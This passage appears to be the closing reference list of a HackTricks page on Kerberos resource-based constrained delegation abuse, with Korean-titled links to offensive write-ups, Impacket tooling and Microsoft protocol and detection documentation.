- [3] [Kerberos Resource-based Constrained Delegation: 컴퓨터 객체 탈취](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Resource-Based Constrained Delegation 악용](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity가 도메인을 무너뜨리다: 공격 관점의 Kerberos 개요](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (공식)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [최근 구문을 반영한 간단한 Linux 치트시트](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing 비활성화 → Kerberos relay로 RBCD 수행)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - 도메인 간 및 포리스트 간 RBCD 살펴보기](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - 도메인 간 및 포리스트 간 RBCD 살펴보기: 2부](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket 브랜치 - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation 개요](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - 도메인 간 S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Kerberos에서 RC4 사용 감지 및 해결](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – S4U2Proxy 세부 정보](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
- [17] [James Forshaw - 일반 사용자 계정을 사용해 RBCD 악용하기](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
- [18] [Hunter Wade - SPN이 없는 계정을 대상으로 Protocol Transition 없이 Constrained Delegation 악용하기](https://hunio.org/security/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts/)
- [19] [Sprocket Security - SPN이 없는 계정을 대상으로 Protocol Transition 없이 Constrained Delegation 악용하기](https://www.sprocketsecurity.com/blog/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts)
- [20] [Impacket PR #2324 - U2U를 사용한 S4U2Proxy](https://github.com/fortra/impacket/pull/2324)
- [21] [Microsoft MS-SFU - ServicesAllowedToSendForwardedTicketsTo 사용](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/6d76bf10-3c48-4e14-9992-df1bd456455e)
- [22] [Microsoft Learn - Kerberos 이벤트 로깅 사용](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-kerberos-event-logging)
{{#include ../../banners/hacktricks-training.md}}
